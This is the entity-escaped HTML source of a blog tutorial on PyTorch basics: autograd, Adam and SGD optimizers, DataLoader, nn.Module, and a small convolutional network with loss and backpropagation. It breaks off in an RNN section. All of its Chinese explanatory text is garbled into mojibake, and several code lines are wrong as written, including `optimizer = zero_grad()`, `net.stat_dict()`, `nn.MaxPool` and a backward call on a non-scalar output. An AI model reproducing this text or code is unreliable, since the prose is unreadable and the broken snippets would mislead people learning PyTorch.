&lt;p&gt;è¿™ç§æ–¹æ³•æ˜¯æ±‚è§£æ¢¯åº¦å¹¶è¿›è¡Œåå‘ä¼ æ’­ï¼Œä¹Ÿå°±æ˜¯è¯´è¯¥æ–¹æ³•å®Œæˆäº†æ¢¯åº¦çš„æ±‚è§£è¿‡ç¨‹ä»¥åŠåå‘ä¼ æ’­çš„è¿‡ç¨‹&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ç¤ºä¾‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;# MSEå‡æ–¹è¯¯å·®
x = torch.ones(1)
w = torch.full([1],2)  # y = wx
mse = F.mse_loss(torch.ones(1), x*w)
# è®¡ç®—lossçš„æ¢¯åº¦
torch.autograd.grad(mse, [w])  # ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯lossï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯æ‰€æœ‰ç½‘ç»œå‚æ•°

# æˆ–è€…losså¯¹è±¡å¯ä»¥ç›´æ¥è°ƒç”¨backward()
mse.backward()

&amp;quot;&amp;quot;&amp;quot;
CEL
&amp;quot;&amp;quot;&amp;quot;
a = torch.rand(3)
p = F.softmax(a, dim=0)
p.backward()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;6-ä¼˜åŒ–ç®—æ³•&#34;&gt;6. ä¼˜åŒ–ç®—æ³•&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;x = torch.tensor([0, 0], requires_grad=True)
optimizer = torch.optim.Adam([x], lr=1e-3)  # åˆ›å»ºä¼˜åŒ–å™¨å¯¹è±¡ï¼Œä¼ å…¥çš„æ˜¯å¾…ä¼˜åŒ–çš„å‚æ•°å’Œå­¦ä¹ ç‡

for step in range(20000):
    pred = f(x)
    
    optimizer.zero_grad()
    pred.backward()  # å°±ä¼šç”Ÿæˆç›¸åº”çš„æ¢¯åº¦ä¿¡æ¯
    optimizer.step()  # æ¯æ¬¡è°ƒç”¨ä¸€æ¬¡stepå‡½æ•°å°±ä¼šæ›´æ–°ä¸€æ¬¡x&#39; = x - lr*dx, y&#39; = y - lr*dy...
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;7-datasetdataloader&#34;&gt;7. Dataset/DataLoader&lt;/h3&gt;
&lt;h4 id=&#34;71-dataset&#34;&gt;7.1 Dataset&lt;/h4&gt;
&lt;h4 id=&#34;72-dataloader&#34;&gt;7.2 DataLoader&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;torch.utils.data.DataLoader()

# å¸¸ç”¨å‚æ•°
- dataset
- batch_size
- shuffle é¡ºåºæ‰“ä¹±ï¼Œé»˜è®¤ä¸ºFalse
- num_workers åŠ è½½æ•°æ®çš„çº¿ç¨‹æ•°é‡ï¼Œé»˜è®¤ä¸º0ï¼Œä¸»çº¿ç¨‹åŠ è½½

dataloader = DataLoader(dataset, 64, shuffle=True)
for batch_data, targets in dataloader:
    ...
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;8-nnlinear&#34;&gt;8. nn.Linear()&lt;/h3&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1657554574378.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;8-nnmoduleæ¨¡å—&#34;&gt;8. nn.Moduleæ¨¡å—&lt;/h3&gt;
&lt;p&gt;å½“è‡ªå·±éœ€è¦å®ç°ä¸€ä¸ªç½‘ç»œæ¨¡å‹çš„æ—¶å€™éœ€è¦ç»§æ‰¿è¿™ä¸ªç±»ï¼Œåœ¨å†…éƒ¨å®šä¹‰çš„æ¯ä¸€ä¸ªå±‚æ¬¡ä¹Ÿæ˜¯nn.Moduleç±»ï¼Œæ‰€ä»¥å®ƒä»¬ä¹‹é—´æœ‰åµŒå¥—å…³ç³»ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Every Layer is nn.Module&lt;/li&gt;
&lt;li&gt;nn.Module nested in nn.Module&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ç»§æ‰¿nn.Moduleç±»åï¼Œéœ€è¦åœ¨&lt;code&gt;__init__(self)&lt;/code&gt;å‡½æ•°ä¸­å®šä¹‰è‡ªå·±ç½‘ç»œçš„æ‰€æœ‰å±‚ç»“æ„ï¼Œç„¶ååœ¨&lt;code&gt;forward(self)&lt;/code&gt;å‡½æ•°ä¸­ä¸²è”æ¯ä¸ªå±‚ã€‚&lt;/p&gt;
&lt;h4 id=&#34;81-å®¹å™¨container&#34;&gt;8.1 å®¹å™¨container&lt;/h4&gt;
&lt;p&gt;å¦‚æœå±‚æ¬¡éå¸¸å¤šçš„è¯ï¼Œå¯ä»¥å°†æ‰€æœ‰å±‚æ¬¡éƒ½å®šä¹‰åœ¨&lt;code&gt;nn.Sequential()&lt;/code&gt;ä¸­ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;self.net = nn.Sequential(
	nn.Conv2d(1, 32, 5, 1, 1),
    nn.MaxPool(2, 2),
    nn.ReLU(True),
    nn.BatchNorm2d(32),
    
    nn.Conv2d(32, 64, 3, 1, 1),
    nn.ReLU(True),
    nn.BatchNorm2d(64),
    
    ...
    # è¿™å…¶ä¸­å¯ä»¥ç”¨è‡ªå·±çš„å®šä¹‰çš„å…¶å®ƒç½‘ç»œ
)
# æ³¨æ„Squentialæ¥å—çš„å‚æ•°éƒ½æ˜¯class
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™ç§æ–¹å¼å°±ä¸éœ€è¦ä¸ºæ¯ä¸ªå±‚å®šä¹‰ä¸€ä¸ªå˜é‡ï¼Œä¹Ÿä¸éœ€è¦ä¸ºæ¯ä¸ªå…¶è¿›è¡Œforwardä¸²è”ã€‚&lt;/p&gt;
&lt;h4 id=&#34;82-å‚æ•°ç®¡ç†&#34;&gt;8.2 å‚æ•°ç®¡ç†&lt;/h4&gt;
&lt;p&gt;nn.Moduleä¼šå¯¹ç½‘ç»œä¸­çš„å‚æ•°è¿›è¡Œç®¡ç†ï¼Œ&lt;code&gt;net.parameters()&lt;/code&gt;ä¼šè¿”å›æ‰€æœ‰ç½‘ç»œä¸­çš„å‚æ•°ï¼Œé€šå¸¸ä½¿ç”¨è¿™ç§æ–¹æ³•å°†æ‰€æœ‰å‚æ•°ä¼ åˆ°ä¼˜åŒ–å™¨ä¸­å»ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ç¤ºä¾‹&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;class BasicNet(nn.Module):
    def __init__(self):
        super(BasicNet, self).__init__()
        self.net = nn.Linear(4, 3)
    
    def forward(self, x):
        return self.net(x)
    
class Net(nn.Module):
    def __init__(self):
        super(Net, self).__init__()
        self.net = nn.Sequential(
        	BasicNet(),
            nn.ReLU(),
            nn.Linear(3,2)
        )
    
    def forward(self, x):
        return self.net(x)
    
device = torch.device(&#39;cuda&#39;)
net = Net()
net.to(device)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;save/load&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;net.load_state_dict(torch.load(&#39;ckpt.mdl&#39;))
# train...

torch.save(net.stat_dict(), &#39;ckpt.mdl&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;train/test&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;å¯¹äºdropoutç­‰æœ‰çš„å±‚ç»“æ„æ¥è¯´ï¼Œtrainå’Œtestçš„çŠ¶æ€æ˜¯ä¸å¤ªä¸€æ ·çš„ï¼Œnn.Moduleæä¾›äº†çŠ¶æ€åˆ‡æ¢çš„æ–¹æ³•ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;net.train()  # train
net.eval()  # test
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;h3 id=&#34;9-pytorchç¥ç»ç½‘ç»œç»“æ„&#34;&gt;9. PyTorchç¥ç»ç½‘ç»œç»“æ„&lt;/h3&gt;
&lt;p&gt;ç¥ç»ç½‘ç»œå¯ä»¥é€šè¿‡torch.nnåŒ…æ¥æ„å»ºã€‚ç¥ç»ç½‘ç»œæ˜¯åŸºäºè‡ªåŠ¨æ¢¯åº¦æ¥å®šä¹‰ä¸€äº›æ¨¡å‹ï¼Œä¸€ä¸ªnn.ModuleåŒ…æ‹¬å±‚å’Œä¸€ä¸ªforwoard(input)æ–¹æ³•ï¼Œè¿”å›ä¸ºoutputã€‚&lt;/p&gt;
&lt;p&gt;ä¾‹å¦‚ä¸€ä¸ªå‰é¦ˆç¥ç»ç½‘ç»œï¼Œå®ƒæ¥å—è¾“å…¥ï¼Œè®©è¾“å…¥ä¸€ä¸ªæ¥ç€ä¸€ä¸ªçš„é€šè¿‡ä¸€äº›å±‚ï¼Œæœ€åç»™å‡ºè¾“å‡ºã€‚&lt;/p&gt;
&lt;p&gt;ä¸€ä¸ªå…¸å‹çš„ç¥ç»ç½‘ç»œè®­ç»ƒè¿‡ç¨‹åŒ…æ‹¬ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;å®šä¹‰ä¸€ä¸ªåŒ…å«å¯è®­ç»ƒå‚æ•°çš„ç¥ç»ç½‘ç»œ&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;è¿­ä»£æ•´ä¸ªè¾“å…¥&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;é€šè¿‡ç¥ç»ç½‘ç»œå¤„ç†è¾“å…¥&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;è®¡ç®—æŸå¤±&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;åå‘ä¼ æ’­æ¢¯åº¦åˆ°ç¥ç»ç½‘ç»œçš„å‚æ•°&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æ›´æ–°ç½‘ç»œå‚æ•°ï¼Œå…¸å‹çš„ç”¨ä¸€ä¸ªç®€å•çš„æ›´æ–°æ–¹æ³•ï¼š&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mo&gt;âˆ’&lt;/mo&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;_&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mo&gt;âˆ—&lt;/mo&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;weight = weight - learning\_rate * gradient
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8888799999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8888799999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ’&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.00444em;vertical-align:-0.31em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mord&#34; style=&#34;margin-right:0.02778em;&#34;&gt;_&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ—&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8888799999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;91-å®šä¹‰ç¥ç»ç½‘ç»œ&#34;&gt;9.1 å®šä¹‰ç¥ç»ç½‘ç»œ&lt;/h4&gt;
&lt;p&gt;å®šä¹‰ç¥ç»ç½‘ç»œçš„ç»“æ„ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import torch
import torch.nn as nn
import torch.nn.functional as F


class Net(nn.Module):

    def __init__(self):
        super(Net, self).__init__()
        # 1 input image channel, 6 output channels, 5x5 square convolution
        # kernel
        self.conv1 = nn.Conv2d(1, 6, 5)
        self.conv2 = nn.Conv2d(6, 16, 5)
        # an affine operation: y = Wx + b
        self.fc1 = nn.Linear(16 * 5 * 5, 120)
        self.fc2 = nn.Linear(120, 84)
        self.fc3 = nn.Linear(84, 10)

    def forward(self, x):
        # Max pooling over a (2, 2) window
        x = F.max_pool2d(F.relu(self.conv1(x)), (2, 2))
        # If the size is a square you can only specify a single number
        x = F.max_pool2d(F.relu(self.conv2(x)), 2)
        x = x.view(-1, self.num_flat_features(x))
        x = F.relu(self.fc1(x))
        x = F.relu(self.fc2(x))
        x = self.fc3(x)
        return x

    def num_flat_features(self, x):
        size = x.size()[1:]  # all dimensions except the batch dimension
        num_features = 1
        for s in size:
            num_features *= s
        return num_features


net = Net()
print(net)

&#39;&#39;&#39;
Net(
  (conv1): Conv2d(1, 6, kernel_size=(5, 5), stride=(1, 1))
  (conv2): Conv2d(6, 16, kernel_size=(5, 5), stride=(1, 1))
  (fc1): Linear(in_features=400, out_features=120, bias=True)
  (fc2): Linear(in_features=120, out_features=84, bias=True)
  (fc3): Linear(in_features=84, out_features=10, bias=True)
)
&#39;&#39;&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™æ˜¯ä¸€ä¸ªå‰é¦ˆç½‘ç»œï¼Œç„¶ååå‘ä¼ æ’­å‡½æ•°é»˜è®¤è¢«autograd(è‡ªåŠ¨æ¢¯åº¦)å®šä¹‰äº†ã€‚&lt;/p&gt;
&lt;p&gt;ä¸€ä¸ªæ¨¡å‹çš„å¯è®­ç»ƒçš„å‚æ•°å¯ä»¥é€šè¿‡è°ƒç”¨&lt;code&gt;net.parameters()&lt;/code&gt;è¿”å›ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;params = list(net.parameters())
print(len(params))
print(params[0].size())

&#39;&#39;&#39;
10
torch.Size([6,1,5,5])
&#39;&#39;&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;92-å¤„ç†è¾“å…¥&#34;&gt;9.2 å¤„ç†è¾“å…¥&lt;/h4&gt;
&lt;p&gt;æ¥ç€å°†è¾“å…¥æ”¾åˆ°ç½‘ç»œä¸­ï¼Œå°†å¾—åˆ°çš„è®¡ç®—ç»“æœè°ƒç”¨åå‘ä¼ æ’­ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;input = torch.randn(1, 1, 32, 32)
out = net(input)
print(out)

&#39;&#39;&#39;
tensor([[-0.0233,  0.0159, -0.0249,  0.1413,  0.0663,  0.0297, -0.0940, -0.0135,
          0.1003, -0.0559]], grad_fn=&amp;lt;AddmmBackward&amp;gt;)
&#39;&#39;&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;93-è°ƒç”¨åå‘ä¼ æ’­&#34;&gt;9.3 è°ƒç”¨åå‘ä¼ æ’­&lt;/h4&gt;
&lt;p&gt;ç„¶åæŠŠæ‰€æœ‰å‚æ•°æ¢¯åº¦ç¼“å­˜å™¨ç½®é›¶ï¼Œç”¨éšæœºçš„æ¢¯åº¦æ¥åå‘ä¼ æ’­&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;net.zero_grad()
out.backward(torch.randn(1, 10))
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è‡³æ­¤ï¼Œå®Œæˆäº†å®šä¹‰ä¸€ä¸ªç¥ç»ç½‘ç»œï¼Œå¤„ç†å‡ºå…¥ä»¥åŠè°ƒç”¨åå‘ä¼ æ’­ã€‚&lt;/p&gt;
&lt;p&gt;ä¸‹é¢è¿˜éœ€è¦å¤„ç†ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;è®¡ç®—æŸå¤±å€¼&lt;/li&gt;
&lt;li&gt;æ›´æ–°ç½‘ç»œä¸­çš„æƒé‡&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;94-è®¡ç®—æŸå¤±å€¼&#34;&gt;9.4 è®¡ç®—æŸå¤±å€¼&lt;/h4&gt;
&lt;p&gt;æŸå¤±å‡½æ•°éœ€è¦ä¸€å¯¹è¾“å…¥ï¼Œå³æ¨¡å‹çš„è¾“å‡ºå’ŒçœŸå®ç›®æ ‡ï¼Œç„¶åè¿”å›ä¸€ä¸ªå€¼è¡¨ç¤ºä¼°è®¡å€¼ä¸çœŸå®ç›®æ ‡çš„è·ç¦»ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨nnåŒ…ä¸­å®šä¹‰äº†å¤šç§æŸå¤±å‡½æ•°ï¼Œæ¯”å¦‚ä¸€ä¸ªç®€å•çš„æŸå¤±å‡½æ•°æ˜¯&lt;code&gt;nn.MSELoss&lt;/code&gt;ï¼Œè¿™æ˜¯ä¸ªè®¡ç®—å‡æ–¹è¯¯å·®çš„æŸå¤±å‡½æ•°ã€‚&lt;/p&gt;
&lt;p&gt;ä¾‹å¦‚ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;output = net(input)
target = torch.randn(10)
target = target.view(1, -1)
criterion = nn.MSELoss()

loss = criterion(output, target)
print(loss)

&#39;&#39;&#39;
tensor(1.3389, grad_fn=&amp;lt;MseLossBackWard&amp;gt;)
&#39;&#39;&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;95-å°†æŸå¤±æ·»åŠ åˆ°åå‘ä¼ æ’­&#34;&gt;9.5 å°†æŸå¤±æ·»åŠ åˆ°åå‘ä¼ æ’­&lt;/h4&gt;
&lt;p&gt;ç°åœ¨éœ€è¦è·ŸéšæŸå¤±åˆ°åå‘ä¼ æ’­è·¯å¾„ï¼Œå¯ä»¥ä½¿ç”¨å®ƒçš„&lt;code&gt;.grad_fn&lt;/code&gt;å±æ€§ï¼Œå…¶è®¡ç®—å›¾ä¸ºï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;input -&amp;gt; conv2d -&amp;gt; relu -&amp;gt; maxpool2d -&amp;gt; conv2d -&amp;gt; relu -&amp;gt; maxpool2d -&amp;gt; view -&amp;gt; linear -&amp;gt; relu -&amp;gt; linear -&amp;gt; relu -&amp;gt; linear -&amp;gt; MSELoss -&amp;gt; loss
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ‰€ä»¥ï¼Œå½“è°ƒç”¨&lt;code&gt;loss.backward()&lt;/code&gt;ï¼Œæ•´ä¸ªå›¾éƒ½ä¼šå¾®åˆ†ï¼Œè€Œä¸”æ‰€æœ‰çš„åœ¨å›¾ä¸­çš„&lt;code&gt;requires_grad=True&lt;/code&gt;çš„å¼ é‡å°†ä¼šè®©ä»–ä»¬çš„gradå¼ é‡ç´¯è®¡æ¢¯åº¦ã€‚&lt;/p&gt;
&lt;p&gt;ä¸ºäº†å®ç°åå‘ä¼ æ’­æŸå¤±ï¼Œæ‰€æœ‰éœ€è¦åšçš„äº‹ä»…ä»…æ˜¯ä½¿ç”¨&lt;code&gt;loss.backward()&lt;/code&gt;ã€‚éœ€è¦æ¸…ç©ºç°å­˜çš„æ¢¯åº¦ï¼Œä¸ç„¶å°†ä¼šå’Œç°å­˜çš„æ¢¯åº¦ç´¯è®¡åˆ°ä¸€èµ·ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;net.zero_grad() # å°†ç°å­˜æ¢¯åº¦æ¸…é›¶
loss.backward() # åå‘ä¼ æ’­
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;96-æ›´æ–°å‚æ•°&#34;&gt;9.6 æ›´æ–°å‚æ•°&lt;/h4&gt;
&lt;p&gt;æœ€ç®€å•çš„æ›´æ–°è§„åˆ™å°±æ˜¯éšæœºæ¢¯åº¦ä¸‹é™ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;weight = weight - learning_rate * gradient
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;torch.optim&lt;/code&gt;åŒ…ä¸­å®ç°äº†å¤šç§æ›´æ–°è§„åˆ™å‡½æ•°ï¼Œä¾‹å¦‚SGDï¼ŒNesterov-SGDï¼ŒAdamï¼ŒRMSPropç­‰ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;optimizer = optim.SGD(net.parameters(), lr=0.01) # åˆ›å»ºä¼˜åŒ–å™¨
optimizer = zero_grad() # æ¸…é›¶æ¢¯åº¦ç³»æ•°
output = net(input) # å¤„ç†è¾“å…¥
loss = criterion(output, target) # è®¡ç®—æŸå¤±
loss.backward() # åå‘ä¼ æ’­
optimizer.step() # æ›´æ–°å‚æ•°
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;10-cnn&#34;&gt;10. CNN&lt;/h3&gt;
&lt;h3 id=&#34;11-rnn&#34;&gt;11. RNN&lt;/h3&gt;
&lt;h4 id=&#34;111-æ¨¡å‹çš„å‚æ•°ç»´åº¦&#34;&gt;11.1 æ¨¡å‹çš„å‚æ•°ç»´åº¦&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;å•å±‚RNN&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;å¯¹äºå•å±‚çš„RNNï¼Œä¹Ÿå°±æ˜¯æ¯ä¸ªæ—¶åˆ»&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;t&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.61508em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;çš„è¾“å…¥&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;x_t&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.58056em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2805559999999999em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;â€‹&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; 